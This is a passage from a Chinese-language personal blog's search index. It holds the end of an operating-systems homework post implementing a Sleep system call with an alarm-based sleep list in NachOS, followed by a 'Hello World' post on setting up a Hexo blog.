class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SC_Sleep 12</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sleep</span><span class="hljs-params">(<span class="hljs-type">int</span> number)</span></span>; <br></code></pre></td></tr></table></figure><p>slide 中有提到我們需要實作 WaitUntil，所以我們就用 WaitUntil 來達成 Sleep 的效果<br>&#x2F;code&#x2F;userprog&#x2F; exception.cc</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">case</span> SC_Example:<br>    val=kernel-&gt;machine-&gt;<span class="hljs-built_in">ReadRegister</span>(<span class="hljs-number">4</span>);<br>    cout &lt;&lt; <span class="hljs-string">&quot;Sleep time:&quot;</span> &lt;&lt; val &lt;&lt; endl;<br>    kernel-&gt;alarm-&gt;<span class="hljs-built_in">WaitUntil</span>(val);<br>    <span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>&#x2F;code&#x2F;test&#x2F;start.s 加上 assembly，根據理解這裡並不是什麼很底層的組語，只是把我們做的 system call 編號放進 $2 裡面在去 call 他而已</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++">    .globl Sleep<br>    .ent Sleep<br>Sleep:<br>    addiu $<span class="hljs-number">2</span>,$<span class="hljs-number">0</span>,SC_Sleep<br>    syscall<br>    j $<span class="hljs-number">31</span><br>    .end Sleep<br></code></pre></td></tr></table></figure><p>接著就要完成 WaitUntil 了，在 &#x2F;code&#x2F;threads&#x2F;alarm.h 中已經有宣告這個 function 了，要在 &#x2F;code&#x2F;threads&#x2F;alarm.cc 中完成他<br>不過因為還會需要加上一些東西所以還是有動到 &#x2F;code&#x2F;threads&#x2F;alarm.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 多 include 這兩個檔案</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> ALARM_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALARM_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;copyright.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;utility.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;callback.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;timer.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;thread.h&quot;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SleepList</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-built_in">SleepList</span>():<span class="hljs-built_in">counter</span>(<span class="hljs-number">0</span>) &#123;&#125;;<br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PutToSleep</span><span class="hljs-params">(Thread *t, <span class="hljs-type">int</span> x)</span></span>;<br> <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">PutToReady</span><span class="hljs-params">()</span></span>;<br> <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-keyword">private</span>:<br>        <span class="hljs-comment">// 包含這個 thread 的 sleep 結束時間的物件</span><br>        <span class="hljs-keyword">class</span> <span class="hljs-title class_">SleepThread</span> &#123;<br>            <span class="hljs-keyword">public</span>:<br>         <span class="hljs-built_in">SleepThread</span>(Thread* t, <span class="hljs-type">int</span> x):<span class="hljs-built_in">sleeper</span>(t), <span class="hljs-built_in">when</span>(x) &#123;&#125;;<br>         Thread* sleeper;<br>         <span class="hljs-type">int</span> when;    <span class="hljs-comment">// 結束時間</span><br>        &#125;;<br>        <span class="hljs-type">int</span> counter;    <span class="hljs-comment">// 這個 counter 是不停累加上去的，每一次呼叫 PutToReady 都會增加</span><br>        std::list&lt;sleepthread&gt; threadlist;    <span class="hljs-comment">// 存放 sleep 中的 thread</span><br>&#125;;<br><br><span class="hljs-comment">// The following class defines a software alarm clock. </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Alarm</span> : <span class="hljs-keyword">public</span> CallBackObj &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Alarm</span>(<span class="hljs-type">bool</span> doRandomYield); <span class="hljs-comment">// Initialize the timer, and callback </span><br>    <span class="hljs-comment">// to &quot;toCall&quot; every time slice.</span><br>    ~<span class="hljs-built_in">Alarm</span>() &#123; <span class="hljs-keyword">delete</span> timer; &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">WaitUntil</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>; <span class="hljs-comment">// suspend execution until time &gt; now + x</span><br>    SleepList sleepList; <span class="hljs-comment">// for implementing Sleep() function.</span><br><br>  <span class="hljs-keyword">private</span>:<br>    Timer *timer;  <span class="hljs-comment">// the hardware timer device</span><br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CallBack</span><span class="hljs-params">()</span></span>;  <span class="hljs-comment">// called when the hardware</span><br>    <span class="hljs-comment">// timer generates an interrupt</span><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// ALARM_H</span></span><br></code></pre></td></tr></table></figure><p>&#x2F;code&#x2F;threads&#x2F;alarm.cc<br>根據 Morris’ Blog，每隔一段時間每隔一段時間 kernal 就會去呼叫一次 Alarm::CallBack()，所以把 PutToReady() 放進去，變成說每次呼叫 CallBack() 都會去檢查有沒有該醒來的 thread，如果有就把他從 sleeplist 裡面踢掉，並丟去 ReadyToRun 裡面</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> </span><br><span class="hljs-function"><span class="hljs-title">Alarm::CallBack</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    Interrupt *interrupt = kernel-&gt;interrupt;<br>    MachineStatus status = interrupt-&gt;<span class="hljs-built_in">getStatus</span>();<br>    <span class="hljs-type">bool</span> woken = sleepList.<span class="hljs-built_in">PutToReady</span>();<br><br>    <span class="hljs-comment">// 多加上兩個條件，一個是檢查是否 woken，一個是檢查還有沒有正在 sleep 的 thread</span><br>    <span class="hljs-comment">// 若是都沒有就可以關掉 timer 了</span><br>    <span class="hljs-keyword">if</span> (status == IdleMode &amp;&amp; !woken &amp;&amp; sleepList.<span class="hljs-built_in">IsEmpty</span>()) &#123; <span class="hljs-comment">// is it time to quit?</span><br>        <span class="hljs-keyword">if</span> (!interrupt-&gt;<span class="hljs-built_in">AnyFutureInterrupts</span>()) &#123;<br>     timer-&gt;<span class="hljs-built_in">Disable</span>(); <span class="hljs-comment">// turn off the timer</span><br> &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;   <span class="hljs-comment">// there&#x27;s someone to preempt</span><br> interrupt-&gt;<span class="hljs-built_in">YieldOnReturn</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// implement WaitUntil function.</span><br><span class="hljs-function"><span class="hljs-type">void</span> </span><br><span class="hljs-function"><span class="hljs-title">Alarm::WaitUntil</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// save previous setting as oldLevel and disable interrupt.</span><br>    <span class="hljs-comment">// SetLevel 是決定這個 thread 能不能被 interrupt</span><br>    <span class="hljs-comment">// 這裡是把原本的 level 存起來然後把當前設定成不能被 interrupt</span><br>    IntStatus oldLevel = kernel-&gt;interrupt-&gt;<span class="hljs-built_in">SetLevel</span>(IntOff);<br>    Thread* t = kernel-&gt;currentThread;<br>    sleepList.<span class="hljs-built_in">PutToSleep</span>(t, x);               <span class="hljs-comment">// put current thread to sleep list.</span><br>    kernel-&gt;interrupt-&gt;<span class="hljs-built_in">SetLevel</span>(oldLevel);    <span class="hljs-comment">// recover old interrupt state.</span><br>&#125;<br><br><span class="hljs-comment">// check if there is still thread sleeping</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SleepList::IsEmpty</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> threadlist.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// put the thread into sleep list</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SleepList::PutToSleep</span><span class="hljs-params">(Thread*t, <span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// check if it cannot be interrupt.</span><br>    <span class="hljs-built_in">ASSERT</span>(kernel-&gt;interrupt-&gt;<span class="hljs-built_in">getLevel</span>() == IntOff);<br>    threadlist.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">SleepThread</span>(t, counter + x));  <span class="hljs-comment">// put into the list</span><br>    t-&gt;<span class="hljs-built_in">Sleep</span>(<span class="hljs-literal">false</span>);<br>&#125;<br><br><span class="hljs-comment">// will be call in callback</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SleepList::PutToReady</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">bool</span> woken = <span class="hljs-literal">false</span>;<br>    counter ++;<br><br>    <span class="hljs-comment">// check all thread in the list if there are thread already finish sleeping</span><br>    <span class="hljs-keyword">for</span>(std::list&lt;sleepthread&gt;::iterator it = threadlist.<span class="hljs-built_in">begin</span>();<br>        it != threadlist.<span class="hljs-built_in">end</span>(); )<br>    &#123;<br>        <span class="hljs-comment">// &#x27;when&#x27; 就是被創造時的 counter 加上他要 sleep 的時間，也就是他應該醒來的時間</span><br>        <span class="hljs-comment">// 所以我們檢查 when 跟 counter 來判斷他該不該醒來</span><br>        <span class="hljs-comment">// &#x27;when&#x27; is time the thread should wake up</span><br>        <span class="hljs-comment">// if counter &gt;= when, this thread will be ready to run.</span><br>        <span class="hljs-keyword">if</span>(counter &gt;= it-&gt;when)<br>        &#123;<br>            <span class="hljs-comment">// 若是他該醒來就把從睡覺 list 中去掉，然後把他叫醒 (用 ReadyToRun)</span><br>            woken = <span class="hljs-literal">true</span>;<br>            kernel-&gt;scheduler-&gt;<span class="hljs-built_in">ReadyToRun</span>(it-&gt;sleeper);<br>            it = threadlist.<span class="hljs-built_in">erase</span>(it);<br>        &#125;<br>        <span class="hljs-comment">// if the thread is not ready to run, keep checking next thread in the list.</span><br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            it++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> woken;<br>&#125;<br></code></pre></td></tr></table></figure><p>最後在 test 中寫兩個 .c 檔，讓他們一起跑來看看 sleep 有沒有正確運作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// /code/test/sleep1.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;syscall.h&quot;</span></span><br><span class="hljs-built_in">main</span>()<br>&#123;<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">1000000</span>);<br>    <span class="hljs-built_in">PrintInt</span>(<span class="hljs-number">123</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>這樣跑十次 sleep2 才會跑一次 sleep1 才對</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// /code/test/sleep2.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;syscall.h&quot;</span></span><br><span class="hljs-built_in">main</span>()<br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;<br>        <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">100000</span>);<br>        <span class="hljs-built_in">PrintInt</span>(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>到這裡作業就完成了，大部分內容參考上面那兩個 blog 的，花了很多時間去看懂他們的 code 和追原有的 code，才去自己寫寫看，只是給自己做個紀錄，還是要花點時間對系統架構更深的理解才會比較得心應手吧，另外還有 Nini 學長的 blog 中提到檢查該醒來的 thread 那邊可以進行的優化有試著去做做看，之後有時間再補上，嗯。</p>]]></content>
    
    
    <categories>
      
      <category>homework</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World !</title>
    <link href="/2019/10/01/2019-10-01-Hello-2019/"/>
    <url>/2019/10/01/2019-10-01-Hello-2019/</url>
    
    <content type="html"><![CDATA[<h1 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h1><p>嗨這是我用 github page 寫的第一篇 blog，摸索了很久也試過 blogger，不過用 blogger 放程式碼比較不方便，加上我已經習慣用 markdown 來做筆記了，所以就把 blog 移到這邊來，希望可以持續久一點把一些學習到的東西記錄下來，這個 blog 是照著 <a href="https://github.com/qiubaiying/qiubaiying.github.io/wiki/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B">BY Blog</a> 的教學做出來的，在windows上建立本地端的環境則是照著 <a href="https://wcc723.github.io/jekyll/2014/01/13/windows-jekyll-server/">Casper Blog</a> 做出來的(windows真的超麻煩，大感謝卡斯柏的教學)，接下來希望也可以加上留言板那些功能，大概就這樣。</p><p>然後不免俗地來一個，順便測試放code的功能</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Hello World !&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2020-x2F-06-更新"><a href="#2020-x2F-06-更新" class="headerlink" title="2020&#x2F;06 更新"></a>2020&#x2F;06 更新</h1><p>從 jekyll 偷偷搬成 Hexo 了，最近有時間又想起曾經希望可以有 TOC 在旁邊的這件事，就把它搬了一下，把 CSS 文件照搬到這了，還有 TOC 不知道為什麼是壞的，所以就稍微修了一下，但是我現在找不到我查到的來源了 orz，另外這個 theme 在 hexo 上拉是 <a href="http://beantech.org/">BeanTech</a> 的，大概這樣，再記個常用指令好了。</p><ul><li>生成靜態檔案<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo <span class="hljs-keyword">generate</span><br></code></pre></td></tr></table></figure></li><li>清除快取檔案( db.json ) 和已產生的靜態檔案( public )<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br></code></pre></td></tr></table></figure></li><li>本地跑起<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">hexo <span class="hljs-keyword">server</span> -g<br></code></pre></td></tr></table></figure></li><li>deploy 上去<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo deploy</span><br></code></pre></td></tr></table></figure>其他的可以看 <a href="https://hexo.io/zh-tw/docs/commands.html">這裡</a> ，大概就醬 !</li></ul>]]></content>
    
    
    <categories>
      
      <category>cluster</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hello</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
